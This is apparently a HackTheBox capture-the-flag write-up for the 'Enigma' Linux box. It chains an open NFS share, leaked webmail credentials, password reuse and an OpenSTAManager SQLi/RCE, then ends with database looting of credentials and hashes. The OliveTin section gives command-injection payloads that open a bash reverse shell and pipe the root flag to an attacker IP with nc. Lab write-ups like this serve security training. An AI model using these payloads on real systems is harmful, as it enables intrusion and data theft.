---
title: "Enigma"
description: "HackTheBox Season 11 — NFS leak to webmail to OpenSTAManager RCE, then OliveTin command injection for root."
---

<a href="https://labs.hackthebox.com/achievement/machine/1439304/915" style="display:block;max-width:560px;margin:1.5rem auto;text-decoration:none;border-radius:14px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.45);font-family:system-ui,-apple-system,sans-serif;">
  <div style="height:104px;background:#141D2B url('https://labs.hackthebox.com/images/achievementBG.png') center/cover;position:relative;">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e514a2-69e8-4e79-82ab-176c3b5a26b4-1780052657.png" alt="Enigma" width="76" height="76" style="position:absolute;left:50%;bottom:-38px;transform:translateX(-50%);border-radius:50%;background:#1A2332;box-shadow:0 0 0 4px #1A2332;" />
  </div>
  <div style="background:#1A2332;padding:52px 20px 22px;text-align:center;">
    <div style="color:#fff;font-size:1.2rem;font-weight:600;">Enigma has been Pwned</div>
    <div style="height:1px;margin:14px auto;max-width:240px;background:linear-gradient(to right,transparent,#9FEF00,transparent);"></div>
    <div style="color:#A4B1CD;font-size:.9rem;"><span style="color:#fff;">d10m3d3s</span> pwned this machine</div>
    <div style="display:flex;justify-content:center;margin-top:20px;">
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">#1849</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">MACHINE RANK</div></div>
      <div style="flex:1;padding:4px;border-left:1px solid #111927;border-right:1px solid #111927;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">28 Jun 2026</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">PWN DATE</div></div>
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">585</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">XP EARNED</div></div>
    </div>
  </div>
</a>

**Enigma** is a Linux (Ubuntu) box that chains a long credential trail. An open
**NFS** export leaks an onboarding PDF with mail creds; the webmail exposes a
password‑reuse path to an internal support portal running **OpenSTAManager**,
which is vulnerable to SQL injection and RCE. From that foothold we loot config
files and databases for a working SSH user, and finally abuse an **OliveTin**
action that passes user input straight into a shell command — running as root.

:::note[Attack path at a glance]
`NFS export` → PDF creds → **Roundcube** webmail → password reuse → support
portal creds → **OpenSTAManager** SQLi + RCE → config/DB looting →
`haris` SSH (user) → **OliveTin** `db_pass` command injection → **root**.
:::

## Reconnaissance

### Nmap

```text title="nmap -sVC -p- 10.129.19.28"
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp  open  pop3     Dovecot pop3d
111/tcp  open  rpcbind  2-4 (RPC #100000)
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      39377/tcp   mountd
143/tcp  open  imap     Dovecot imapd (Ubuntu)
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 Dovecot pop3d
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A mail‑server profile: **SSH**, **nginx** (redirecting to `enigma.htb`), a full
**Dovecot** IMAP/POP3 stack, and — most interesting — **rpcbind + NFS** on
`2049`.

```bash
echo '10.129.19.28 enigma.htb mail001.enigma.htb support_001.enigma.htb' | sudo tee -a /etc/hosts
```

## NFS — the onboarding leak

List the exports and mount the world‑readable share:

```bash title="showmount / mount"
showmount -e 10.129.19.28
# Exports list on 10.129.19.28:
# /srv/nfs/onboarding

sudo mount -t nfs -o resvport 10.129.19.28:/srv/nfs/onboarding /tmp/enigma
```

The share holds an onboarding **PDF** containing first‑set credentials for the
webmail:

```text title="onboarding PDF"
http://mail001.enigma.htb
kevin
Enigma2024!
```

:::tip
Always `showmount -e` an exposed NFS server — onboarding/HR shares are a classic
spot for plaintext starter credentials.
:::

## Webmail — Roundcube & password reuse

`http://mail001.enigma.htb` is **Roundcube Webmail** `1.6.16`, with these
plugins enabled:

| Plugin                  | Version | License   |
| ----------------------- | ------- | --------- |
| archive                 | 3.5     | GPL‑3.0+  |
| filesystem_attachments  | 1.0     | GPL‑3.0+  |
| jqueryui                | 1.13.2  | GPL‑3.0+  |
| zipdownload             | 3.4     | GPL‑3.0+  |

`kevin` : `Enigma2024!` logs in. The bigger win is **password reuse**: user
`sarah` reuses the same password, and her mailbox holds an IT‑provisioning email
with credentials for an internal support portal:

```text title="Mail to Sarah — IT Support"
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can
use the admin account to get started.
```

## OpenSTAManager — SQLi to RCE

`http://support_001.enigma.htb` runs **OpenSTAManager**. It's vulnerable to SQL
injection through the `ajax_select.php` endpoint:

```http title="SQL injection — ajax_select.php"
GET /ajax_select.php?op=preventivi&options[idanagrafica]=1&options[stato]=1 HTTP/1.1
Host: support_001.enigma.htb
X-Requested-With: XMLHttpRequest
Referer: http://support_001.enigma.htb/controller.php?id_module=1
Cookie: PHPSESSID=7khn14clhsabkeft18n48cvbmo
```

- Advisory: [GHSA‑3gw8‑3mg3‑jmpc](https://github.com/devcode-it/openstamanager/security/advisories/GHSA-3gw8-3mg3-jmpc)
- Working exploit: [sploitus — OpenSTAManager](https://sploitus.com/exploit?id=52E3EC4D-B3B2-5A5A-B602-597C9814297E)

Running the exploit gives a shell on the box.

## Post‑Exploitation — looting configs & databases

With a foothold, the application config files hand over the local databases.

**Roundcube** config — MySQL DSN and the IMAP `des_key`:

```php title="roundcube config.inc.php"
$config['db_dsnw'] = 'mysql://roundcube:Yo270x26!gTx02@localhost/roundcubemail';

// Used to encrypt users' IMAP password stored in the session record.
$config['des_key'] = 'mUW4idQIgKeYum1hcONJCkCR';
```

```sql title="roundcubemail.users"
mysql -u roundcube -p'Yo270x26!gTx02' -h localhost -D roundcubemail
mysql> select * from users;
+---------+----------+-----------+---------------------------------------------------+
| user_id | username | mail_host | preferences                                       |
+---------+----------+-----------+---------------------------------------------------+
|       1 | kevin    | localhost | a:1:{s:11:"client_hash";s:16:"jXKCkTD6NJX1CfH7";} |
|       2 | sarah    | localhost | a:1:{s:11:"client_hash";s:16:"E2t73i4vcknHDz71";} |
+---------+----------+-----------+---------------------------------------------------+
```

**OpenSTAManager** config — a second MySQL account:

```php title="openstamanager config.inc.php"
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Its `zz_users` table stores bcrypt hashes for `admin` and `haris`:

```sql title="openstamanager.zz_users"
mysql> select id, username, password, email from zz_users;
+----+----------+--------------------------------------------------------------+------------------+
| id | username | password                                                     | email            |
+----+----------+--------------------------------------------------------------+------------------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |
+----+----------+--------------------------------------------------------------+------------------+
```

Cracking `haris`'s bcrypt hash recovers a reused system password.

### Loot summary

| Source                     | Username    | Secret            |
| -------------------------- | ----------- | ----------------- |
| NFS onboarding PDF         | `kevin`     | `Enigma2024!`     |
| Password reuse (mailbox)   | `sarah`     | `Enigma2024!`     |
| IT support email           | `admin`     | `Ne3s4rtars78s`   |
| Roundcube config (MySQL)   | `roundcube` | `Yo270x26!gTx02`  |
| OpenSTAManager config      | `brollin`   | `Fri3nds@9099`    |
| `zz_users` crack           | `haris`     | `bestfriends`     |

## User

`haris` : `bestfriends` is a valid system account — SSH in for the user flag:

```bash
ssh haris@enigma.htb
```

## Privilege Escalation — OliveTin command injection

A service listens on local port `1337`: **OliveTin**, a web UI that runs
pre‑defined shell commands. Locate its install and config:

```bash title='find / -iname "*olivetin*" 2>/dev/null'
/var/www/olivetin
/opt/OliveTin/OliveTin-linux-amd64/var/helper-actions/olivetin-get-dashboard-icons
/opt/OliveTin/OliveTin-linux-amd64/var/helper-actions/olivetin-get-git-repo
/opt/OliveTin/OliveTin-linux-amd64/var/helper-actions/olivetin-get-theme
/opt/OliveTin/OliveTin-linux-amd64/var/helper-actions/olivetin-setup-easy-ssh
```

OliveTin runs as **root**, and its config defines a *backup database* action
that drops the user‑supplied `db_pass` argument **directly** into the shell
command — a textbook argument injection. Forward `1337` over SSH and submit a
malicious `db_pass`:

```bash title="db_pass injection payload"
# reverse shell as root
'; bash -c "bash -i >& /dev/tcp/10.10.14.64/4444 0>&1" #

# ...or just exfil the flag directly
'; nc 10.10.14.64 4444 < /root/root.txt #
```

The `'` closes the intended argument, the `;` starts our command, and `#`
comments out the remainder — OliveTin runs it as root.

:::caution
The action executes with root privileges and no sanitisation of `db_pass`. Any
authenticated OliveTin user therefore has an immediate path to full compromise.
:::

## Takeaways

- **NFS exports are foothold gold.** One world‑readable onboarding share seeded
  the entire chain with a starter credential.
- **Password reuse is the connective tissue.** `Enigma2024!` bridged `kevin` →
  `sarah` → the support portal; cracked hashes bridged the app DB → `haris`.
- **Never interpolate user input into a shell.** OliveTin's `db_pass` argument
  injection turns a convenience action into a root shell.
